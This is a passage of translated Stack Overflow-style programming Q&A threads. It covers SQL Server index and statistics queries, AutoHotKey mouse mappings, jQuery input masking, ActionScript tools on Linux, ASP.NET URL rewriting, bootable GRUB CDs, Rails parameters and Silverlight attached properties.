                                          ORDER BY
                                                 MAX(IC1.key_ordinal) 
                                                 FOR XML PATH('')
                                      ),
                                      1,
                                      2,
                                      ''
                                  ) KeyColumns
                           FROM   sys.index_columns IC2 
                                  --WHERE IC2.Object_id = object_id('Person.Address') --Comment for all tables
                           GROUP BY
                                  IC2.object_id,
                                  IC2.index_id
                       ) tmp3
            )tmp4
            ON  I.object_id = tmp4.object_id
            AND I.Index_id = tmp4.index_id
       JOIN sys.stats ST
            ON  ST.object_id = I.object_id
            AND ST.stats_id = I.index_id
       JOIN sys.data_spaces DS
            ON  I.data_space_id = DS.data_space_id
       JOIN sys.filegroups FG
            ON  I.data_space_id = FG.data_space_id
       LEFT JOIN (
                SELECT *
                FROM   (
                           SELECT IC2.object_id,
                                  IC2.index_id,
                                  STUFF(
                                      (
                                          SELECT ' , ' + C.name
                                          FROM   sys.index_columns IC1
                                                 JOIN sys.columns C
                                                      ON  C.object_id = IC1.object_id
                                                      AND C.column_id = IC1.column_id
                                                      AND IC1.is_included_column = 
                                                          1
                                          WHERE  IC1.object_id = IC2.object_id
                                                 AND IC1.index_id = IC2.index_id
                                          GROUP BY
                                                 IC1.object_id,
                                                 C.name,
                                                 index_id 
                                                 FOR XML PATH('')
                                      ),
                                      1,
                                      2,
                                      ''
                                  ) IncludedColumns
                           FROM   sys.index_columns IC2 
                                  --WHERE IC2.Object_id = object_id('Person.Address') --Comment for all tables
                           GROUP BY
                                  IC2.object_id,
                                  IC2.index_id
                       ) tmp1
                WHERE  IncludedColumns IS NOT NULL
            ) tmp2
            ON  tmp2.object_id = I.object_id
            AND tmp2.index_id = I.index_id
WHERE  I.is_primary_key = 0
       AND I.is_unique_constraint = 0
       --AND T.name NOT LIKE 'mt_%'
       --AND I.name NOT LIKE 'mt_%'
           --AND I.Object_id = object_id('Person.Address') --Comment for all tables
           --AND I.name = 'IX_Address_PostalCode' --comment for all indexes 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-06-25T14:43:36.400

我编写了这段代码来遍历服务器中的所有数据库，并将其推送到名为 Maintenance 的数据库中的表中。您应该首先创建此数据库，然后在该数据库中创建一个包含以下字段的表：

```
CREATE TABLE [dbo].[DBCC_Stats](
    [ID] [int] IDENTITY(1,1) NOT NULL,
    [DatabaseName] [varchar](50) NULL,
    [SchemaName] [nvarchar](128) NULL,
    [TableName] [sysname] NOT NULL,
    [StatName] [nvarchar](128) NULL,
    [modification_counter] [bigint] NULL,
    [rows] [bigint] NULL,
    [rows_sampled] [bigint] NULL,
    [% Rows Sampled] [bigint] NULL,
    [last_updated] [datetime2](7) NULL,
    [DateEntered] [datetime] NULL,
 CONSTRAINT [PK_DBCC_Stats] PRIMARY KEY CLUSTERED 
(
    [ID] ASC
)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY]
GO

ALTER TABLE [dbo].[DBCC_Stats] ADD  CONSTRAINT [DF_DBCC_Stats_DateEntered]  DEFAULT (getdate()) FOR [DateEntered] 
```

要使用下面的存储过程，您需要传入服务器名称。usp_Execute_Stats '[你的服务器名]'

```
`CREATE PROCEDURE usp_Execute_Stats
    @ServerName varchar(100)
AS
BEGIN
DECLARE @strSQL varchar(max)
SET @strSQL='USE ?
SELECT      ''' + '?' + ''' AS DatabaseName,OBJECT_SCHEMA_NAME(obj.object_id) SchemaName, obj.name TableName,
           stat.name StatName, modification_counter,
            [rows], rows_sampled, rows_sampled* 100 / [rows] AS [% Rows Sampled],
            last_updated
FROM        ' + @ServerName + '.' + '?' + '.sys.objects AS obj
INNER JOIN  ' + @ServerName + '.' + '?' + '.sys.stats AS stat ON stat.object_id = obj.object_id
CROSS APPLY sys.dm_db_stats_properties(stat.object_id, stat.stats_id) AS sp
WHERE       obj.is_ms_shipped = 0
ORDER BY    modification_counter DESC'
INSERT INTO Maintenance.dbo.vwDBCC_Stats
EXEC sp_MSforeachdb @strSQL
--Delete older logs
DELETE Maintenance.dbo.DBCC_Stats
    --WHERE DatabaseName IN('Master','Model','MSDB','TempDB')
    WHERE [DateEntered] < getdate()-14
END` 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-11-08T03:36:17.510

我没有清楚的解释为什么索引没有存储在 sys.objects 中。但我想为找到一种简单的方法来列出数据库中所有表和视图的所有索引做出贡献。以下查询检索所有索引，包括它们的类型以及它们的对象 ID 和对象类型。

```
use /*Enter here your database*/
go
select A.Object_id,B.name,B.type,B.type_desc, A.index_id,A.type,A.type_desc
from sys.indexes A left join sys.objects B on A.object_id=B.object_id
where B.type = 'U' or B.type='V' /*filtering on U or V to retrieve tables and views only*/
order by B.name ASC /*Optional sorting*/ 
```

# visual-studio - 在 Visual Studio 2008 中使用鼠标前后导航

> ID：425492
> 
> 赞同：6
> 
> 时间：2009-01-08T19:14:34.773
> 
> 标签：visual-studio

我安装的 Visual Studio 2008 不支持在 C# 代码编辑器中使用鼠标进行 IE 样式的前后导航。

搜索显示多个人遇到了这个问题，但我还没有找到正确的解决方案。

甚至还有一个[VS 插件 hack](http://www.codeproject.com/KB/macros/MouseNavi.aspx)只是为了解决“错误”。

知道为什么此功能对某些用户失败以及如何修复它吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-09-17T17:49:01.977

[您可以通过AutoHotKey](http://ahkscript.org)工具（免费、开源）缓解问题。

假设您的 Visual Studio 2008 具有以下编辑器命令及其各自的快捷方式：

*   `View.NavigateBackward`= `Ctrl`+`-`
*   `View.NavigateForward`= `Ctrl`+ `Shift`+`-`

您应该能够在键盘选项中**验证**这些快捷键。已验证？让我们继续。

那么，如果 Visual Studio 的主窗口处于活动状态，您的鼠标会发送这些键盘快捷键，您会不会很好？

然后安装工具并添加以下两个映射：

```
XButton1::^-
XButton2::^+- 
```

这些对应于上面的键盘快捷键：`^`= `Ctrl`, `+`= `Shift`, `-`=`-`

使用通知区域中的 AutoHotKey 图标，重新加载刚刚更新的定义文件。现在您的鼠标按钮应该会产生上述快捷方式。测试它们。如果它们在 Visual Studio 编辑器中为您工作，您可以将它们限制在 Visual Studio 主窗口中，否则它们在整个桌面上工作：

```
SetTitleMatchMode, RegEx
#IfWinActive, .*- Microsoft Visual Studio

XButton1::^-
XButton2::^+-

#IfWinActive 
```

如果需要，请随意调整标题匹配的正则表达式。
不要忘记重新加载定义文件以应用您所做的任何更改。

奖励：
如果您按住`Shift`或，这里还有一些其他方便的操作`Ctrl`：（
您有那些鼠标按钮，让我们使用它们......用于整个桌面上的命令。）

```
+XButton1::^c
+XButton2::^v
^XButton1::^x
^XButton2::^z 
```

（字母必须小写，因为大写表示`Shift`+字母。）
（并且始终确保您运行的是 AHK 提升（以管理员身份）。）

享受！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-17T17:40:57.850

Visual Studio 2008 是一个编辑器，其中内置的应用程序也可以在任何更高版本中构建，例如 Visual Studio 2015。不要试图轻率，但解决方法是迁移到更高版本的 Studio。如果金钱是一个因素，请查看社区版本。（请参阅[免费开发工具 - Visual Studio Community 2015](https://www.visualstudio.com/en-us/products/visual-studio-community-vs.aspx)）

# javascript - 用于防止输入任何不匹配正则表达式的输入的 jquery 插件

> ID：425497
> 
> 赞同：7
> 
> 时间：2009-01-08T19:15:47.687
> 
> 标签：javascript, jquery, jquery-plugins

jquery 是否有任何插件可以防止将任何输入输入到与正则表达式模式不匹配的文本框中。例如，我有一个用于输入付款金额的文本框，我希望用户只能输入数字和。在文本框中，所有其他输入不会对文本框产生任何影响..

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-08T19:19:34.920

[屏蔽输入插件](http://digitalbush.com/projects/masked-input-plugin/)

```
jQuery(function($){   
    $("#paymentAmount").mask("9999.99");
}); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-07-17T00:26:15.107

[jquery-keyfilter 插件](http://code.google.com/p/jquery-keyfilter/)- 做需要的事情。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-08T21:59:48.183

我不认为有任何这样的插件现成可用。这个问题有点棘手，因为您必须允许用户在应用您的正则表达式之前输入一些输入。也就是说，您不能只匹配输入的每个字符，除非您的正则表达式仅定义一组字符。

举例来说，如果他们正在输入付款金额，并且您希望在单个字符的基础上允许数字和小数，那么是什么阻止了他们输入`99.99.23.42492`？

另一方面，如果你提供一个完整的正则表达式`/\d+\.\d{2}/`，那么它在单个字符上根本不匹配，你必须允许他们在尝试应用正则表达式之前输入一些字符并清除他们的输入如果不匹配。这可能令人沮丧。

如果您真的想在输入时过滤输入，那么您希望允许第一个字符使用数字，然后允许后续字符使用数字或小数，直到输入小数，然后再输入两个数字，然后不再输入。它不是通用过滤器。

例如，这里有一些代码可以做到这一点，但它非常难看。

```
 myInput.keydown(function() {
       var text = this.val
       if(!/^\d/.test(text)) {
          return '';
       } else {
          done = text.match(/^(\d+\.\d\d)/);
          if (done) { return done[0]; }

          last_char = text.substr(text.length-1,1);
          decimal_count = text.replace(/[^\.]/g,'').length;

          if (decimal_count < 1) {
             if (!/[\d\.]/.test(last_char)) {
                return text.substr(0,text.length-1);
             }
          } else if (decimal_count == 1 && last_char == '.') {
             return text;
          } else {
             if (!/[\d]/.test(last_char)) {
                return text.substr(0,text.length-1);
             }
          }
          return text;
       }
    }); 
```

当然，如果他们碰巧粘贴了某些值而没有进行“真正的”输入，这将不起作用。

也许其他一些方法对你更有效？就像突出显示该字段并向用户指示他们是否输入了非数字、非小数或是否输入了多个小数，而不是过滤输入本身，因为这看起来很混乱。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T21:30:03.347

正如 jQuery 文档中所建议的那样，键盘事件有点棘手。
[http://unixpapa.com/js/key.html](http://unixpapa.com/js/key.html)
[http://yehudakatz.com/2007/07/03/event-normalization-in-jquery-113/](http://yehudakatz.com/2007/07/03/event-normalization-in-jquery-113/)

与您有关的困难是：

> **识别键**
> 当您捕捉到一个键盘事件时，您可能希望知道按下了哪个键。如果是这样，你可能要求太多了。这是浏览器不兼容和错误的一大堆。
> *从上面的第一个链接*

同样，在 jQuery 中我会这样做：

```
textBoxElement.keydown( function( e ) {
    var chr = String.fromCharCode( e.which );
    if( !/[0-9.]/.test( chr ) ) {
        e.preventDefault();
    }
} 
```

这也将禁用其他重要的键，如 enter、tab、delete，因此需要将它们添加到条件中。并非所有其他键都是可打印的，因此不能进行正则表达式，因此您必须检查它们的 e.keyCode。13、8等

如果你对正则表达式不太在意，你可以做类似的事情

```
textBoxElement.keydown( function( e ) {
    switch( e.keyCode ) {
        case 48: //0
        case 49: //1
        case 50: //2
        case 51: //3
        case 52: //4
        case 53: //5
        case 54: //6
        case 55: //7
        case 56: //8
        case 57: //9
        case 48: //10
        case 37: //left
        case 39: //right
        case 8:  //tab
        case 13: //return
        case 46: //del
        case 190: //.
            return;
    }
    e.preventDefault();
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-02-16T19:18:06.340

这是我使用的一个简单的 jquery 扩展：

```
jQuery.fn.DecimalMask = function () {
  return this.each(function () {
    $(this).keypress(function (e) {
      var keynum;
      if (window.event) // IE
      {
        keynum = e.keyCode;
      }
      else if (e.which) // Netscape/Firefox/Opera
      {
        keynum = e.which;
      }
      if (typeof keynum == 'undefined') return true;
      else if (keynum == 46 && $(this).val().indexOf(".") > -1) return false; //already has a decimal point
      else return ((keynum > 47 && keynum < 58) || keynum == 13 || keynum == 8 || keynum == 9 || keynum == 46 || keynum == 45); //allow ony number keys or keypad number keys
    });
  });
};
//implementation
$("#mytxtbox").DecimalMask(); 
```

# linux - 我需要在 ActionScript 中开发哪些工具（在 Linux 中）

> ID：425511
> 
> 赞同：19
> 
> 时间：2009-01-08T19:18:49.930
> 
> 标签：linux, actionscript, ubuntu

我以前从未开发过 Flash，但我有一个项目，我想在其中使用 ActionScript 3 库，但我不确定我需要启动哪些工具。更复杂的是，我的主要开发盒子是一个 Ubuntu 盒子。我需要安装任何必要的软件包吗？或者有什么`.deb`我可以买的吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-08T19:44:49.097

一个 Windows 或 Mac 盒子。:-)

开个玩笑，实际上您可以使用上面提到的 Flex 3 SDK 并使用 CLI 进行编译。如果这些 AS3 库确实是 Flex 库（有时在 Flex 中有效、在 CS3 中有效以及在两者中有效之间存在差异），那么您应该能够导入它们并使用它们。

另外，我自己从未尝试过，但 Flex Builder 是基于 Eclipse 的，如果您更愿意在图形 IDE 中工作，我相信有一种方法可以将 Eclipse 配置为使用开源 Flex 编译器进行编译。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-09-22T07:03:22.347

我写了一篇关于如何设置 Eclipse + AXDT + Flex SDK 以在 Linux 上准备 mxml/actionscript (as3) 开发环境的博客文章。有兴趣的可以看这里： http: [//netpatia.blogspot.com/2009/09/flash-development-on-linux.html](http://netpatia.blogspot.com/2009/09/flash-development-on-linux.html)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-08T19:23:57.453

看起来 Flex 3 sdk ( [http://www.adobe.com/products/flex/flexdownloads/index.html](http://www.adobe.com/products/flex/flexdownloads/index.html) ) 是一个不错的起点。还有其他建议吗？

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-19T17:31:35.223

我对 Sprouts 有很好的体验。它是 Flex SDK 的 ruby​​ 包装器，允许使用 Rake 构建并轻松连接到持续集成引擎。

[http://www.projectsprots.com/](http://www.projectsprouts.com/)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-08T20:55:39.967

我最近一直在使用[Flex Builder Linux](http://labs.adobe.com/technologies/flex/flexbuilder_linux/)，可以推荐它。上手很简单，对于 alpha 版来说，它是稳定的，并且具有您可能想要的所有功能。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-19T17:27:44.323

你可以试试[Haxe](http://haxe.org/)。它不是真正的 ActionScript，但非常相似（您也可以编译到服务器端或 JavaScript）。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-05-11T21:33:16.540

[Project Sprouts](http://projectsprouts.org)可能是在任何操作系统上启动和运行 ActionScript 或 Flex 开发的最快方式，尤其是在 Linux 上。

您需要安装[Ruby](http://www.ruby-lang.org)和[RubyGems](http://rubygems.org)，除此之外，这是几个终端命令，您应该有一个应用程序构建和显示。

您应该能够构建 ActionScript 2、ActionScript 3、AIR 或 Flex 项目，而无需任何手动系统配置。由于 Sprouts 本质上是一个 CLI 应用程序，因此您可以使用您喜欢的任何开发环境并使用简单的命令启动构建，例如：

## 编译并运行调试构建

`rake debug`

## 编译并运行测试工具

`rake test`

## 为部署编译优化的构建

`rake deploy`

## 将您的应用程序编译为库

`rake swc`

## 为您的应用程序生成文档

`rake doc`

当然，您可以使用[Rake](http://martinfowler.com/articles/rake.html)轻松创建或自定义构建脚本，这是一个非常简单和灵活的构建脚本引擎。

与 Rails 一样，Sprouts 还标配有自动创建类、测试用例、测试套件甚至 MXML 组件的代码生成器。

与许多开源项目不同，Sprouts 包含一些非常广泛和[详细的文档](http://projectsprouts.org/rdoc/)。

让我们知道您的想法。

[http://projectsprots.org](http://projectsprouts.org)

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2012-01-11T22:23:53.247

JetBrains IntelliJ IDEA（不是免费的）

[http://www.jetbrains.com/idea/features/flex_ide.html](http://www.jetbrains.com/idea/features/flex_ide.html)

* * *

JetBrains Astella（免费但测试版）

[http://blog.jetbrains.com/astella/](http://blog.jetbrains.com/astella/)

[http://confluence.jetbrains.com/display/AS/Astella+EAP](http://confluence.jetbrains.com/display/AS/Astella+EAP)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-01-16T20:01:33.057

虽然 FlexBuilder 很好，但它缺少 Powerflasher 在 Eclipse 的 FDT（Flash 开发人员工具）中包含的许多功能。FlexBuilder 缺少模板、更好的格式、自动修复警告和错误等内容。它在 Eclipse 上运行，使其跨平台，但要注意他们不在 linux 环境中进行测试（但是人们没有明显的抱怨）。

在此处查看所有功能：http: [//solutions.powerflasher.com/index.php ?id=136#feature_03](http://solutions.powerflasher.com/index.php?id=136#feature_03)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-01-08T19:54:31.247

我使用 Flex SDK、Emacs（您选择的编辑器）和 Ant 作为我的构建工具。我在博客中介绍了如何在此处设置所有内容：

[http://blog.apterainc.com/software/setting-up-a-flex-development-enviroment-in-gnulinux/](http://blog.apterainc.com/software/setting-up-a-flex-development-enviroment-in-gnulinux/)

Adobe 有一个用于 Linux 的 FlexBuilder 的免费 alpha 版本，我认为在编辑 MXML 文件时它非常不稳定，但如果您执行严格的 actionscript 工作，您可能会发现它很有用。你可以在这里得到：

[http://labs.adobe.com/technologies/flex/flexbuilder_linux/](http://labs.adobe.com/technologies/flex/flexbuilder_linux/)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-01-08T21:59:34.613

您可能想看看 MTASC [http://www.mtasc.org/](http://www.mtasc.org/) 一个开源动作脚本编译器。我一直想四处看看它，但还没有机会。听说过很好的事情。希望当我确实解决它并有问题时，你会回答他们

# asp.net - .aspx 的自定义 PageHandlerFactory

> ID：425512
> 
> 赞同：5
> 
> 时间：2009-01-08T19:18:54.513
> 
> 标签：asp.net, httphandler

我正在构建一个相当简单的 CMS。我需要拦截对我的 Web 应用程序中大多数 .aspx 页面的请求，以便完全控制输出。在大多数情况下，输出将从缓存中提取，并且只是纯 HTML。

但是，仍然有几个页面需要使用 asp: 控件。我认为绕过一些特定请求的最佳方法是继承 System.Web.UI.PageHandlerFactory 并在需要时调用 MyBase 实现（如果我在这里错了，请纠正我）。但是如何将所有其他请求转移到我的自定义处理程序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T19:30:34.320

当我编写一个简单的 CMS 时，我很难使用 PageHandlerFactory 让它做我想做的事。最后我切换到了 IHttpModule。

我的模块将首先检查请求的路径中是否有 .aspx 文件。如果页面上有用户控件或由于某种原因不适合 CMS，我只会这样做。因此，如果文件存在，它将从模块中返回。之后，它会查看请求的路径并将其压缩为“导航标签”。因此 ~/aboutus/default.aspx 将变为 page.aspx?nt=aboutusdefault。page.aspx 将从 CMS 加载正确的内容。当然，重定向发生在服务器端，因此用户/蜘蛛永远不会知道发生了什么不同的事情。

```
using System;
using System.Data;
using System.Collections.Generic;
using System.Configuration;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Web;

namespace MyCMS.Handlers {
    /// <summary>
    /// Checks to see if we should display a virutal page to replace the current request.
    /// Code adapted from:
    /// Rewrite.NET -- A URL Rewriting Engine for .NET
    /// By Robert Chartier
    /// http://www.15seconds.com/issue/030522.htm
    /// </summary>
    public class VirtualPageModule : IHttpModule {
        /// <summary>
        /// Init is required from the IHttpModule interface
        /// </summary>
        /// <param name="Appl"></param>
        public void Init(System.Web.HttpApplication Appl) {
            // make sure to wire up to BeginRequest
            Appl.BeginRequest += new System.EventHandler(Rewrite_BeginRequest);
        }

        /// <summary>
        /// Dispose is required from the IHttpModule interface
        /// </summary>
        public void Dispose() {
            // make sure you clean up after yourself
        }

        /// <summary>
        /// To handle the starting of the incoming request
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="args"></param>
        public void Rewrite_BeginRequest(object sender, System.EventArgs args) {
            // Cast the sender to an HttpApplication object
            HttpApplication httpApp = (HttpApplication)sender;

            // See if the requested file already exists
            if (System.IO.File.Exists(httpApp.Request.PhysicalPath)) {
                // Do nothing, process the request as usual
                return;
            }

            string requestPath = VirtualPathUtility.ToAppRelative(httpApp.Request.Path);

            // Organic navigation tag (~/aboutus/default.aspx = nt "aboutusdefault")
            Regex regex = new Regex("[~/\\!@#$%^&*()+=-]");
            requestPath = regex.Replace(requestPath, string.Empty).Replace(".aspx", string.Empty);
            string pageName = "~/page.aspx";
            string destinationUrl = VirtualPathUtility.ToAbsolute(pageName) + "?nt=" + requestPath;
            SendToNewUrl(destinationUrl, httpApp);
        }

        public void SendToNewUrl(string url, HttpApplication httpApp) {
            applyTrailingSlashHack(httpApp);
            httpApp.Context.RewritePath(
                url,
                false // RebaseClientPath must be false for ~/ to continue working in subdirectories.
            );
        }

        /// <summary>
        /// Applies the trailing slash hack. To circumvent an ASP.NET bug related to dynamically
        /// generated virtual directories ending in a trailing slash (/).
        /// As described by BuddyDvd:
        /// http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=105061
        /// </summary>
        /// <param name="httpApp">The HttpApplication.</param>
        /// <remarks>
        /// Execute this function before calling RewritePath.
        /// </remarks>
        private void applyTrailingSlashHack(HttpApplication httpApp) {
            if (httpApp.Request.Url.AbsoluteUri.EndsWith("/") && !httpApp.Request.Url.AbsolutePath.Equals("/")) {
                Type requestType = httpApp.Context.Request.GetType();
                object clientFilePath = requestType.InvokeMember("ClientFilePath", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.GetProperty, null, httpApp.Context.Request, null);
                string virtualPathString = (string)clientFilePath.GetType().InvokeMember("_virtualPath", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.GetField, null, clientFilePath, null);
                clientFilePath.GetType().InvokeMember("_virtualPath", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetField, null, clientFilePath, new object[] { virtualPathString });
                requestType.InvokeMember("_clientFilePath", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetField, null, HttpContext.Current.Request, new object[] { clientFilePath });
                object clientBaseDir = requestType.InvokeMember("ClientBaseDir", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.GetProperty, null, httpApp.Context.Request, null);
                clientBaseDir.GetType().InvokeMember("_virtualPath", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetField, null, clientBaseDir, new object[] { virtualPathString });
                requestType.InvokeMember("_clientBaseDir", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetField, null, HttpContext.Current.Request, new object[] { clientBaseDir });
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T19:33:22.130

你的意思是你要注入控制？如果是这种情况，您可能需要考虑一个必需的基类而不是 Page 类。Page 实现 IHttpHandler，因此您可以创建派生类，然后将页面更改为从派生类派生。您将对您的页面有更多的控制权，并能够连接到它及其呈现。

# nhibernate - 如何使用 NHibernate 中的 Criteria API 执行“NOT IN”表达式？

> ID：425514
> 
> 赞同：1
> 
> 时间：2009-01-08T19:19:31.643
> 
> 标签：nhibernate

我可以将 NHibernate Criteria API 用于 IN 语句

```
new NHibernate.InExpression() 
```

有没有办法使用 Criteria API 来获得“NOT IN”语句？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T20:15:45.133

在它周围使用 NotExpression。

# osdev - 如何以编程方式创建可引导 CD？

> ID：425519
> 
> 赞同：7
> 
> 时间：2009-01-08T19:21:20.390
> 
> 标签：osdev, grub, bootable

我正在使用准系统教程作为我正在开发的操作系统的基础，它似乎是一个较旧的教程：它已经将内核编译为软盘映像，然后使用 GRUB 加载它。

基本上，我仍然想使用 GRUB，但我想让我的操作系统从 CD 上运行。主要原因是我实际上没有可用的真正软盘驱动器（我目前正在 VirtualBox 中进行测试），因此我无法在真正的硬件上测试我的操作系统。

我一直在网上四处寻找，我可以找到很多从软盘映像创建可引导 CD 的实用程序，但这些似乎都需要一个真正的软盘驱动器，而且它并不是我真正想要的。理想情况下，我希望能够在我的制作步骤中获得一张可引导的 CD，而无需首先将映像放在软盘上，这似乎毫无意义。

我想回答这个问题的简单方法是：如何设置 GRUB 以从 CD 读取我的内核映像？我是否需要一个特殊的实用程序才能从 Windows 执行此操作？（内核还不能自己编译，这不是很长时间）

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-09T02:00:10.820

我自己找到了我的项目的解决方案，并从 OSdev 的人们那里得到了一些建议。有一个名为 mkisofs 的实用程序（可以使用 cygwin dll 在 Windows 下运行）获取一个目录，并将该目录制作成可以刻录到 CD 的 ISO 映像。使用 -b 标志，您可以指定应驻留在磁盘引导扇区中的文件。

解决方案就是在引导扇区中安装 GRUB，并使用 GRUB 加载内核映像，我可以轻松地将其编译为非软盘形式。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-08T19:26:17.403

AFAIK 可启动 CD 与可启动软盘几乎相同。您需要将引导加载程序 (GRUB) 放入引导扇区等，BIOS 将处理低级内容，直到您切换到保护模式。

您可能必须制作映像，然后将其添加到实际的物理磁盘。

这是 El Torito 可启动 CD 规范： [http ://www.phoenix.com/NR/rdonlyres/98D3219C-9CC9-4DF5-B496-A286D893E36A/0/specscdrom.pdf](http://www.phoenix.com/NR/rdonlyres/98D3219C-9CC9-4DF5-B496-A286D893E36A/0/specscdrom.pdf)

**编辑**：测试内核的另一种方法是可引导的 USB 记忆棒。同样，BIOS 将处理低级 USB 内容，直到您打开 A20 并跳转到保护模式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T20:41:53.943

如果您对查看代码感兴趣，那么[Moblin Image Creator](http://v1.moblin.org/projects/projects_image-creator.php)可能是一个值得一试的好应用程序。它是用 python 编写的，可以为 Moblin Linux 的 Live 和可安装配置创建不同类型的可引导映像（CD、USB 和 NAND）。

# ruby-on-rails - Rails：修改数据库前修改表单参数

> ID：425521
> 
> 赞同：11
> 
> 时间：2009-01-08T19:21:54.353
> 
> 标签：ruby-on-rails, ruby, activerecord

我正在开发一个通过表单发送数据的 Rails 应用程序。我想在表单发送*后*，但在处理*之前*修改表单的一些“参数” 。

**我现在拥有的**

```
{"commit"=>"Create",
  "authenticity_token"=>"0000000000000000000000000"
  "page"=>{
    "body"=>"TEST",
    "link_attributes"=>[
      {"action"=>"Foo"},
      {"action"=>"Bar"},
      {"action"=>"Test"},
      {"action"=>"Blah"}
    ]
  }
} 
```

**我想要的是**

```
{"commit"=>"Create",
  "authenticity_token"=>"0000000000000000000000000"
  "page"=>{
    "body"=>"TEST",
    "link_attributes"=>[
      {"action"=>"Foo",
       "source_id"=>1},
      {"action"=>"Bar",
       "source_id"=>1},
      {"action"=>"Test",
       "source_id"=>1},
      {"action"=>"Blah",
       "source_id"=>1},
    ]
  }
} 
```

这可行吗？基本上，我试图一次提交两种类型的数据（“页面”和“链接”），并将“链接”的“source_id”分配给“页面”的“id”。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-01-08T20:28:18.820

在将其提交到数据库之前，您可以在控制器中编写代码，该代码将获取参数并在保存之前附加不同的信息。例如：

```
FooController < ApplicationController

  def update
    params[:page] ||= {}
    params[:page][:link_attributes] ||= []
    params[:page][:link_attriubtes].each { |h| h[:source_id] ||= '1' }
    Page.create(params[:page])
  end

end 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2017-09-25T08:13:23.807

# 在使用强参数之前编辑参数

好的，所以（恢复这个老问题）我遇到了很多麻烦，我想在它到达模型之前修改一个参数（并保持强大的参数）。我终于想通了，这是基础知识：

```
def update
  sanitize_my_stuff
  @my_thing.update(my_things_params)
end

private

def sanitize_my_stuff
  params[:my_thing][:my_nested_attributes][:foo] = "hello"
end

def my_things_params
  params.permit(etc etc)
end 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-09T13:45:20.670

您还应该查看回调，特别是 before_validate（如果您使用验证）、before_save 或 before_create。

在不知道如何保存数据的情况下，很难为您提供如何使用它们的具体示例，但它可能看起来与 Gaius 给出的示例非常相似。

# c# - 调用 tableAdapter 的 Fill() 方法时如何防止 selectedValue 改变？

> ID：425531
> 
> 赞同：0
> 
> 时间：2009-01-08T19:24:27.920
> 
> 标签：c#, bindingsource, tableadapter, binding

我已将我的 ListBox 绑定到一些数据。

问题是当我调用 myTableAdapter.Fill(..) 方法时，SelectedValue 更改为列表中的第一个项目 ID。尽管 VS 中的“选定值”未绑定到任何地方（见图）。 [替代文字 http://img370.imageshack.us/img370/2548/ss20090108212745qz2.png](http://img370.imageshack.us/img370/2548/ss20090108212745qz2.png)

请问如何防止这种行为？

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-08-17T16:40:55.183

您不应该对每个请求都具有约束力。如果出于某种原因您绝对必须绑定每个请求，则必须手动在 ListBox 上设置 SelectedIndex。这是因为 Fill 方法首先清除列表，然后为获取的数据创建新的列表项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-08-17T16:50:26.710

我能想到的最简单的方法是将表格适配器填充代码更改为如下内容：

```
string preSelected = myDropDownList.SelectedValue;
myTableAdapter.Fill(myDataTable);
myDropDownList.SelectedValue = preSelected;
```

如果该项目不再存在，您将遇到问题，因此您可能需要添加一个条件来检查它。

# .net - silverlight：如何以编程方式设置附加属性

> ID：425537
> 
> 赞同：22
> 
> 时间：2009-01-08T19:25:53.003
> 
> 标签：.net, silverlight, silverlight-2.0

假设我有一个包含一些行定义的网格，以及该网格中的一个子控件。我将如何以编程方式设置子控件的 Grid.Row 属性？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2009-01-08T22:21:24.520

要设置值：

```
textBlock.SetValue(Grid.RowProperty, 3); 
```

要重置值：

```
textBlock.SetValue(Grid.RowProperty, null); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-09T18:02:38.717

实际上要清除一个值，你应该使用这个：

```
textBlock.ClearValue(Grid.RowProperty); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-08T19:35:44.183

我不是 100% 确定这是在 SilverLight 中，但在 WPF 中，您在定义附加属性的类型上调用静态方法（称为 SetX，其中 X 是属性）并将其传递给在哪个控件中设置值, 和值：

```
Grid.SetRow(MyControl, myRowNumber); 
```

